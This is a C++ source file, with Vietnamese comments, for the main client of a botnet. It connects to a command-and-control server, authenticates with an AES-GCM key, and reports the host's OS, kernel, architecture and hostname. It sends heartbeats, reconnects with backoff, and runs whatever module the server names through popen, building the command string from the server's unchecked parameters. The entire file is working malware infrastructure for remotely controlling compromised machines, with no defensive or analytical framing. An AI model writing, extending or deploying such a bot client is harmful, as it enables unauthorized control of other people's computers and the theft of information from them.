// client.cpp — Bot chính: kết nối CNC, auth, nhận lệnh, gọi module
#include <csignal>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <thread>
#include <unistd.h>

#include "common.h"

static volatile bool running = true;

void sig_handler(int) {
    running = false;
}

static int connect_cnc(const char* host, int port) {
    struct addrinfo hints{}, *res;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[16];
    std::snprintf(port_str, sizeof(port_str), "%d", port);

    int ret = getaddrinfo(host, port_str, &hints, &res);
    if (ret != 0) return -1;

    int sock = -1;
    for (auto* rp = res; rp; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock < 0) continue;
        if (::connect(sock, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    return sock;
}

static int exec_module(const std::string& module, const std::string& params_json, std::string& output) {
    std::string cmd = "./modules/" + module + " " + params_json;
    FILE* f = popen(cmd.c_str(), "r");
    if (!f) return -1;

    char buf[4096];
    output.clear();
    while (fgets(buf, sizeof(buf), f)) output += buf;
    int status = pclose(f);
    return WEXITSTATUS(status);
}

int main(int argc, char* argv[]) {
    signal(SIGTERM, sig_handler);
    signal(SIGINT, sig_handler);
    signal(SIGPIPE, SIG_IGN);

    const char* host = argc > 1 ? argv[1] : CNC_HOST;
    int port = argc > 2 ? std::atoi(argv[2]) : CNC_PORT;
    const char* key_hex = argc > 3 ? argv[3] : CNC_KEY;

    AesGcm crypto(key_hex);
    std::string key_hash = sha256_hex(key_hex);
    std::string bot_id = get_hostname() + "_" + sha256_hex(get_hostname()).substr(0, 8);

    int delay = RECONNECT_BASE_DELAY;

    while (running) {
        int sock = connect_cnc(host, port);
        if (sock < 0) {
            LOG_ERROR("connect failed, retrying in %ds", delay);
            sleep(delay);
            delay = std::min(delay * 2, RECONNECT_MAX_DELAY);
            continue;
        }

        // Auth
        std::string auth_json = build_auth_msg(bot_id, key_hash);
        if (!send_message(sock, auth_json, crypto)) { close(sock); sleep(delay); continue; }

        std::string ack = recv_message(sock, crypto);
        std::string status = json_get_string(ack, "status");
        if (status != "ok") {
            LOG_ERROR("auth rejected: %s", json_get_string(ack, "message").c_str());
            close(sock);
            return 1;
        }
        LOG_ERROR("auth OK, session=%s", json_get_string(ack, "session_id").c_str());

        // Send system info
        std::string info_json = build_info_msg(get_os_name(), get_os_version(), get_arch(), get_kernel(), get_hostname());
        if (!send_message(sock, info_json, crypto)) { close(sock); sleep(delay); continue; }

        delay = RECONNECT_BASE_DELAY;

        // Main loop
        time_t last_heartbeat = time(nullptr);

        while (running) {
            // Heartbeat
            if (time(nullptr) - last_heartbeat >= HEARTBEAT_INTERVAL) {
                std::string hb = build_heartbeat_msg();
                if (!send_message(sock, hb, crypto)) break;
                last_heartbeat = time(nullptr);
            }

            // Poll for commands (non-blocking, 1s timeout)
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            timeval tv{1, 0};

            if (select(sock + 1, &fds, nullptr, nullptr, &tv) > 0) {
                std::string msg = recv_message(sock, crypto);
                if (msg.empty()) break;

                std::string type = json_get_string(msg, "type");
                if (type == "cmd") {
                    std::string cmd_id = json_get_string(msg, "cmd_id");
                    std::string module = json_get_string(msg, "module");

                    // Extract params as JSON sub-object string
                    std::string params = json_get_obj(msg, "params");

                    LOG_ERROR("exec: %s/%s", module.c_str(), cmd_id.c_str());

                    std::string output;
                    int exit_code = exec_module(module, params, output);

                    std::string result = build_result_msg(cmd_id, output, exit_code);
                    send_message(sock, result, crypto);
                }
            }
        }

        close(sock);
        if (running) {
            LOG_ERROR("disconnected, reconnecting in %ds", delay);
            sleep(delay);
            delay = std::min(delay * 2, RECONNECT_MAX_DELAY);
        }
    }

    return 0;
}
